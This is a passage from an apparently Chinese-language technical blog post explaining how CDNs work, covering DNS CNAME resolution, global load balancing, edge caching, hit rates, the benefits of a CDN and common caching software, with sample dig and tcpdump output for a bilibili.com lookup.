&lt;p&gt;②、当用户点击网站页面上的内容 URL，经过本地 DNS 系统解析，DNS 系统会最终将域名的解析权交给 CNAME 指向的 CDN 专用 DNS 服务器。&lt;/p&gt;
&lt;p&gt;③、CDN 专用 DNS 服务器，将 CDN 的全局负载均衡设备 IP 地址返回用户。也就是上面所说的 GSLB 设备&lt;/p&gt;
&lt;p&gt;④、用户向&lt;strong&gt; CDN 的负载均衡设备&lt;/strong&gt;发起内容 URL 访问请求。&lt;/p&gt;
&lt;p&gt;⑤、CDN 负载均衡设备根据用户 IP 地址，以及用户请求的内容 URL，选择一台用户所属区域的&lt;strong&gt;缓存服务器&lt;/strong&gt;。&lt;/p&gt;
&lt;p&gt;⑥、负载均衡设备告诉用户这台缓存服务器的 IP 地址，让用户向所选择的缓存服务器发起请求。&lt;/p&gt;
&lt;p&gt;⑦、用户向缓存服务器发起请求，缓存服务器响应用户请求，将用户所需内容传送到用户终端。&lt;/p&gt;
&lt;p&gt;⑧、如果这台缓存服务器上并没有用户想要的内容，那么这台缓存服务器就要网站的&lt;strong&gt;源服务器&lt;/strong&gt;请求内容。&lt;/p&gt;
&lt;p&gt;⑨、源服务器返回内容给缓存服务器，缓存服务器发给用户，并根据用户自定义的缓存策略，判断要不要把内容缓存到缓存服务器上。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;img data-src=&#34;https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/u6pjybbkxn.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;ol&gt;
&lt;li&gt;当终端用户（北京）向 &lt;code&gt;www.a.com&lt;/code&gt;  下的指定资源发起请求时，首先向 LDNS（本地 DNS）发起域名解析请求。&lt;/li&gt;
&lt;li&gt;LDNS 检查缓存中是否有 &lt;code&gt;www.a.com&lt;/code&gt;  的 IP 地址记录。如果有，则直接返回给终端用户；如果没有，则向授权 DNS 查询。&lt;/li&gt;
&lt;li&gt;当授权 DNS 解析 &lt;code&gt;www.a.com&lt;/code&gt;  时，返回域名 CNAME www.a.tbcdn.com 对应 IP 地址。&lt;/li&gt;
&lt;li&gt;域名解析请求发送至阿里云 DNS 调度系统，并为请求分配最佳节点 IP 地址。&lt;/li&gt;
&lt;li&gt;LDNS 获取 DNS 返回的解析 IP 地址。&lt;/li&gt;
&lt;li&gt;用户获取解析 IP 地址。&lt;/li&gt;
&lt;li&gt;用户向获取的 IP 地址发起对该资源的访问请求。&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;如果该 IP 地址对应的节点已缓存该资源，则会将数据直接返回给用户，例如，图中步骤 7 和 8，请求结束。&lt;/li&gt;
&lt;li&gt;如果该 IP 地址对应的节点未缓存该资源，则节点向源站发起对该资源的请求。获取资源后，结合用户自定义配置的缓存策略，将资源缓存至节点，例如，图中的北京节点，并返回给用户，请求结束。&lt;/li&gt;
&lt;/ul&gt;
&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;ol&gt;
&lt;li&gt;CDN 的加速资源是跟域名绑定的。&lt;/li&gt;
&lt;li&gt;通过域名访问资源，首先是通过 DNS 分查找离用户最近的 CDN 节点（边缘服务器）的 IP&lt;/li&gt;
&lt;li&gt;通过 IP 访问实际资源时，如果 CDN 上并没有缓存资源，则会到源站请求资源，并缓存到 CDN 节点上，这样，用户下一次访问时，该 CDN 节点就会有对应资源的缓存了。&lt;/li&gt;
&lt;/ol&gt;
&lt;/blockquote&gt;
&lt;p&gt;应用 CDN 后，DNS 返回的不再是 IP 地址，而是一个 CNAME (Canonical Name) 别名记录，指向 CDN 的全局负载均衡 GSLB, GSLB 实际上在域名解析的过程中承担了中间人（或者说代理）的角色，这是 CDN 实现的关键&lt;/p&gt;
&lt;p&gt;CDN 主要功能是在不同的地点缓存内容，通过负载均衡技术，将用户的请求定向到最合适的缓存服务器上去获取内容，比如说，是北京的用户，我们让他访问北京的节点，深圳的用户，我们让他访问深圳的节点。通过就近访问，加速用户对网站的访问。解决 Internet 网络拥堵状况，提高用户访问网络的响应速度。&lt;/p&gt;
&lt;p&gt;由于没有返回 IP 地址，于是本地 DNS 会向负载均衡系统再发送请求 ，则进入到 CDN 的全局负载均衡系统 GSLB 进行智能调度：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;看用户的 IP 地址，查表得知地理位置，找相对最近的边缘节点&lt;/li&gt;
&lt;li&gt;看用户所在的运营商网络，找相同网络的边缘节点&lt;/li&gt;
&lt;li&gt;检查边缘节点的负载情况，找负载较轻的节点&lt;/li&gt;
&lt;li&gt;其他，比如节点的 “健康状况”、服务能力、带宽、响应时间等&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;结合上面的因素，得到最合适的边缘节点，然后把这个节点返回给用户，用户就能够就近访问 CDN 的缓存代理&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/fdde5787e61870ee5d997f1ca89d0870.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
&lt;p&gt;我们可以用 dig 查看 dns 解析结果&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;[root@VM-16-11-centos ~]# dig www.bilibili.com&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;; &amp;lt;&amp;lt;&amp;gt;&amp;gt; DiG 9.11.4-P2-RedHat-9.11.4-26.P2.el7_9.7 &amp;lt;&amp;lt;&amp;gt;&amp;gt; www.bilibili.com&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;;; global options: +cmd&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;;; Got answer:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;;; -&amp;gt;&amp;gt;HEADER&amp;lt;&amp;lt;- opcode: QUERY, status: NOERROR, id: 60626&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;;; flags: qr rd ra; QUERY: 1, ANSWER: 22, AUTHORITY: 0, ADDITIONAL: 0&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;;; QUESTION SECTION:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;;www.bilibili.com.		IN	A&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;;; ANSWER SECTION:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;www.bilibili.com.	144	IN	CNAME	a.w.bilicdn1.com.&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;a.w.bilicdn1.com.	169	IN	CNAME	ct.w.bilicdn1.com.&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ct.w.bilicdn1.com.	60	IN	A	183.131.147.27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ct.w.bilicdn1.com.	60	IN	A	183.131.147.28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ct.w.bilicdn1.com.	60	IN	A	183.131.147.29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ct.w.bilicdn1.com.	60	IN	A	183.131.147.30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ct.w.bilicdn1.com.	60	IN	A	183.131.147.48&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ct.w.bilicdn1.com.	60	IN	A	61.147.236.42&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ct.w.bilicdn1.com.	60	IN	A	117.21.179.18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ct.w.bilicdn1.com.	60	IN	A	61.147.236.44&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ct.w.bilicdn1.com.	60	IN	A	61.147.236.45&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ct.w.bilicdn1.com.	60	IN	A	61.147.236.46&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ct.w.bilicdn1.com.	60	IN	A	116.207.137.66&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ct.w.bilicdn1.com.	60	IN	A	116.207.137.67&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ct.w.bilicdn1.com.	60	IN	A	116.207.137.68&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ct.w.bilicdn1.com.	60	IN	A	61.147.236.43&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ct.w.bilicdn1.com.	60	IN	A	117.21.179.19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ct.w.bilicdn1.com.	60	IN	A	117.21.179.20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ct.w.bilicdn1.com.	60	IN	A	117.23.60.12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ct.w.bilicdn1.com.	60	IN	A	117.23.60.13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ct.w.bilicdn1.com.	60	IN	A	117.23.60.14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ct.w.bilicdn1.com.	60	IN	A	117.23.60.15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;;; Query time: 7 msec&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;;; SERVER: 183.60.83.19#53(183.60.83.19)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;;; WHEN: Fri Nov 25 21:22:04 CST 2022&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;;; MSG SIZE  rcvd: 398&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;在ANSWER SECTION列表可以看出&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;www.bilibili.com为cname记录指向a.w.bilicdn1.com.&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;a.w.bilicdn1.com为cname记录指向ct.w.bilicdn1.com.&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ct.w.bilicdn1.com.返回了20条A记录，这20个ip 信息是&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;中国浙江金华 电信&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;中国江苏南通 电信&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;中国湖北宜昌 电信 &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;中国 陕西省 西安市 电信  -- 117.23.60.14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;比如我在陕西省西安市鄠邑区，可以看出返回的都是就近节点。实际上CDN是有非常多的边缘节点。&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;用 tcpdump 来监控下 DNS 的 UDP 数据包&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;[root@VM-16-11-centos ~]# tcpdump -n -s 1500 udp and port 53&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;tcpdump: verbose output suppressed, use -v or -vv for full protocol decode&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;listening on eth0, link-type EN10MB (Ethernet), capture size 1500 bytes&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21:28:21.393765 IP 10.0.16.11.45832 &amp;gt; 183.60.83.19.domain: 32323+ A? www.bilibili.com. (34)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21:28:21.394724 IP 183.60.83.19.domain &amp;gt; 10.0.16.11.45832: 32323 22/0/0 CNAME a.w.bilicdn1.com., CNAME ct.w.bilicdn1.com., A 61.147.236.42, A 61.147.236.43, A 61.147.236.44, A 61.147.236.45, A 61.147.236.46, A 116.207.137.66, A 116.207.137.67, A 116.207.137.68, A 117.21.179.18, A 117.21.179.19, A 117.21.179.20, A 117.23.60.12, A 171.214.10.140, A 171.214.10.141, A 171.214.10.142, A 183.131.147.27, A 183.131.147.28, A 183.131.147.29, A 183.131.147.30, A 183.131.147.48 (398)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21:28:21.407290 IP 10.0.16.11.32999 &amp;gt; 183.60.83.19.domain: 53397+ PTR? 42.236.147.61.in-addr.arpa. (44)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21:28:21.431995 IP 183.60.83.19.domain &amp;gt; 10.0.16.11.32999: 53397 NXDomain 0/1/0 (93)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;其中，10.0.16.11 为腾讯云服务器内网地址。也就是本机向路由器询问 DNS 解析，如果路由器已经缓存了，就会直接返回。&lt;/p&gt;
&lt;h3 id=&#34;传统的网站访问与cdn访问&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#传统的网站访问与cdn访问&#34;&gt;#&lt;/a&gt; 传统的网站访问与 CDN 访问&lt;/h3&gt;
&lt;p&gt;&lt;strong&gt;传统访问访问：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/n630r4cz49.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;使用了 CDN 的网站访问：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/7qb88zlcll.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
&lt;p&gt;在没有 CDN 的情况下，用户向浏览器输入 &lt;code&gt;www.web.com&lt;/code&gt;  这个域名，客户端访问本地 DNS 服务器的时候，如果本地 DNS 服务器有缓存，则返回网站的地址；如果没有，递归查询到网站的权威 DNS 服务器，这个权威 DNS 服务器是负责 web.com 的，它会返回网站的 IP 地址。&lt;/p&gt;
&lt;p&gt;本地 DNS 服务器缓存下 IP 地址，将 IP 地址返回，然后客户端直接访问这个 IP 地址，就访问到了这个网站。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;然而有了 CDN 之后，情况发生了变化&lt;/strong&gt;。&lt;/p&gt;
&lt;p&gt;在 web.com 这个权威 DNS 服务器上，会设置一个 CNAME 别名，指向另外一个域名 &lt;code&gt;www.web.cdn.com&lt;/code&gt; ，返回给本地 DNS 服务器。&lt;/p&gt;
&lt;p&gt;当本地 DNS 服务器拿到这个新的域名时，需要继续解析这个新的域名。这个时候，再访问的就不是 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3dlYi5jb20=&#34;&gt;web.com&lt;/span&gt; 的权威 DNS 服务器了，而是 web.cdn.com 的权威 DNS 服务器，这是 CDN 自己的权威 DNS 服务器。在这个服务器上，还是会设置一个 CNAME，指向另外一个域名，也即 CDN 网络的全局负载均衡器。&lt;/p&gt;
&lt;p&gt;接下来，&lt;strong&gt;本地 DNS 服务器去请求 CDN 的全局负载均衡器解析域名&lt;/strong&gt;，全局负载均衡器会为用户选择一台合适的缓存服务器提供服务&lt;/p&gt;
&lt;p&gt;基于以上这些条件，进行综合分析之后，全局负载均衡器会返回一台缓存服务器的 IP 地址。&lt;/p&gt;
&lt;p&gt;本地 DNS 服务器缓存这个 IP 地址，然后将 IP 返回给客户端，客户端去访问这个边缘节点，下载资源。 缓存服务器响应用户请求，将用户所需内容传送到用户终端。如果这台缓存服务器上并没有用户想要的内容，那么这台服务器就要向它的上一级缓存服务器请求内容，直至追溯到网站的源服务器将内容拉到本地&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/20200418104105733.png&#34; alt=&#34;在这里插入图片描述&#34;&gt;&lt;/p&gt;
&lt;p&gt;与传统访问方式不同，&lt;strong&gt;CDN 网络则是在用户和服务器之间增加缓存层，将用户的访问请求引导到最优的缓存节点&lt;/strong&gt;而不是服务器源站点，从而加速访问速度。&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/ciawk92i4h.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;缓存代理&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#缓存代理&#34;&gt;#&lt;/a&gt; 缓存代理&lt;/h3&gt;
&lt;p&gt;缓存系统是 CDN 的另一个关键组成部分，缓存系统会有选择地缓存那些最常用的那些资源&lt;/p&gt;
&lt;p&gt;其中有两个衡量 CDN 服务质量的指标：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;回源率：缓存里没有，必须用代理的方式回源站取，回源次数与所有访问次数之比&lt;/li&gt;
&lt;/ul&gt;
&lt;blockquote&gt;
&lt;p&gt;缓存系统也可以划分出层次，分成一级缓存节点和二级缓存节点。一级缓存配置高一些，直连源站，二级缓存配置低一些，直连用户&lt;br&gt;
回源的时候二级缓存只找一级缓存，一级缓存没有才回源站，可以有效地减少真正的回源&lt;/p&gt;
&lt;/blockquote&gt;
&lt;ul&gt;
&lt;li&gt;命中率：用户访问的资源恰好在缓存系统里，可以直接返回给用户，命中次数与所有访问次数之比&lt;/li&gt;
&lt;/ul&gt;
&lt;blockquote&gt;
&lt;p&gt;现在的商业 CDN 命中率都在 90% 以上，相当于把源站的服务能力放大了 10 倍以上&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&#34;0x03-cdn好处&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#0x03-cdn好处&#34;&gt;#&lt;/a&gt; 0x03 CDN 好处&lt;/h2&gt;
&lt;blockquote&gt;
&lt;h6 id=&#34;1-为了实现跨运营商-跨地域的全网覆盖&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#1-为了实现跨运营商-跨地域的全网覆盖&#34;&gt;#&lt;/a&gt; &lt;strong&gt;1. 为了实现跨运营商、跨地域的全网覆盖&lt;/strong&gt;&lt;/h6&gt;
&lt;p&gt;互联不互通、区域 ISP 地域局限、出口带宽受限制等种种因素都造成了网站的区域性无法访问。CDN 加速可以覆盖全球的线路，通过和运营商合作，部署 IDC 资源，在全国骨干节点商，合理部署 CDN 边缘分发存储节点，充分利用带宽资源，平衡源站流量。&lt;/p&gt;
&lt;p&gt;例如中国移动手机用户访问中国电信网络的内容源，可以通过在中国移动假设 CDN 服务器，进行加速。效果是非常明显的。&lt;/p&gt;
&lt;h6 id=&#34;2-为了保障你的网站安全&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#2-为了保障你的网站安全&#34;&gt;#&lt;/a&gt; &lt;strong&gt;2. 为了保障你的网站安全&lt;/strong&gt;&lt;/h6&gt;
&lt;p&gt;CDN 的负载均衡和分布式存储技术，可以加强网站的可靠性，相当无无形中给你的网站添加了一把保护伞，应对绝大部分的互联网攻击事件。防攻击系统也能避免网站遭到恶意攻击。&lt;/p&gt;
&lt;p&gt;内容进行分发后，源服务器的 IP 被隐藏，受到攻击的概率会大幅下降。CDN 可以通过分流 ，洗掉来自 Ddos 大部分的攻击 。&lt;/p&gt;
&lt;h6 id=&#34;3-为了异地备援&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#3-为了异地备援&#34;&gt;#&lt;/a&gt; &lt;strong&gt;3. 为了异地备援&lt;/strong&gt;&lt;/h6&gt;
&lt;p&gt;当某个服务器发生意外故障时，系统将会调用其他临近的健康服务器节点进行服务，进而提供接近 100% 的可靠性，这就让你的网站可以做到永不宕机。&lt;/p&gt;
&lt;h6 id=&#34;4-为了节约成本投入&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#4-为了节约成本投入&#34;&gt;#&lt;/a&gt; &lt;strong&gt;4. 为了节约成本投入&lt;/strong&gt;&lt;/h6&gt;
&lt;p&gt;使用 CDN 加速可以实现网站的全国铺设，你根据不用考虑购买服务器与后续的托管&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9jbG91ZC50ZW5jZW50LmNvbS9zb2x1dGlvbi9vcGVyYXRpb24/ZnJvbT0xMDY4MA==&#34;&gt;运维&lt;/span&gt;，服务器之间镜像同步，也不用为了管理维护技术人员而烦恼，节省了人力、精力和财力。&lt;/p&gt;
&lt;h6 id=&#34;5-为了让你更专注业务本身&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#5-为了让你更专注业务本身&#34;&gt;#&lt;/a&gt; &lt;strong&gt;5. 为了让你更专注业务本身&lt;/strong&gt;&lt;/h6&gt;
&lt;p&gt;CDN 加速厂商一般都会提供一站式服务，业务不仅限于 CDN，还有配套的云存储、大数据服务、视频云服务等，而且一般会提供 7x24 运维监控支持，保证网络随时畅通，你可以放心使用。并且将更多的精力投入到发展自身的核心业务之上。&lt;/p&gt;
&lt;p&gt;6. 互联网服务提供商采用 CDN，是&lt;strong&gt;以存储换时延&lt;/strong&gt;。通信运营商也追捧 CDN，但它们的目的，是&lt;strong&gt;以存储换带宽&lt;/strong&gt; —— 通过服务 “下沉”，减轻上层骨干网络的流量压力，避免硬件扩容，降低网络建设成本。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;img data-src=&#34;https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221125204403468.png&#34; alt=&#34;image-20221125204403468&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;0x04-常用的cdn缓存软件&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#0x04-常用的cdn缓存软件&#34;&gt;#&lt;/a&gt; 0x04 常用的 CDN 缓存软件&lt;/h2&gt;
&lt;blockquote&gt;
&lt;ul&gt;
&lt;li&gt;Varnish ：可以认为是内存缓存，速度一流，但是内存缓存也限制了其容量，缓存页面和图片一般是挺好的；&lt;/li&gt;
&lt;li&gt;squid 是功能最全面的比较传统的 web cache server，有自己的存储引擎。，但是架构太老，性能不怎样。&lt;/li&gt;
&lt;li&gt;nginx 本来是反向代理 /web 服务器，用了插件可以做做这个副业，但是本身不支持的功能比较多&lt;/li&gt;
&lt;/ul&gt;
&lt;/blockquote&gt;
&lt;h2 id=&#34;0x05-cdn相关术语&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#0x05-cdn相关术语&#34;&gt;#&lt;/a&gt; 0x05 CDN 相关术语&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;CDN 相关的术语解释&lt;/strong&gt;&lt;/p&gt;
&lt;h6 id=&#34;1-origin-server源站&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#1-origin-server源站&#34;&gt;#&lt;/a&gt; &lt;strong&gt;1、Origin Server 源站&lt;/strong&gt;&lt;/h6&gt;
